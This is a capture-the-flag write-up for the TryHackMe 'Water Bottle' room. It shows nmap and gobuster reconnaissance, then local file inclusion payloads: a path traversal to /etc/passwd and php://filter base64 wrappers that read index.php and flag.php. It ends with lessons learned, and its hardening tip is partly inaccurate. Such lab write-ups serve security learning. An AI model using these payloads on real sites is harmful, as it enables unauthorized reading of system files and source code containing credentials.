# 💧 Water Bottle

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Water Bottle](https://tryhackme.com/room/waterbottle) |
| **Difficulty** | 🟡 Medium |
| **Category** | Web, PHP Filter LFI |
| **Tools** | nmap, gobuster, curl, browser |

---

## 🎯 Objective

Exploit a PHP web application to read sensitive files using PHP filter chains.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV TARGET_IP
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt -x php
```

The web app loads pages via a `page` parameter.

---

## 💥 Exploitation — PHP Filter Source Disclosure

Test for LFI:
```
http://TARGET_IP/index.php?page=../../../etc/passwd
```

If filtered, use PHP filter wrapper to base64-encode output:

```
http://TARGET_IP/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

Decode the output:
```bash
echo "BASE64_OUTPUT" | base64 -d
```

Read the flag file:
```
http://TARGET_IP/index.php?page=php://filter/convert.base64-encode/resource=flag.php
```

Decode — **flag captured.**

---

## 📚 Lessons Learned

- `php://filter` reads file contents as base64 — bypasses output restrictions
- LFI filter bypasses: wrappers, encoding, null bytes, path truncation
- PHP source disclosure reveals hardcoded credentials, flags, application logic
- Disable `php://`, `file://`, `data://` wrappers via `allow_url_include=Off` in `php.ini`

---
*by OwlRC 🦉 | github.com/OwlRC*
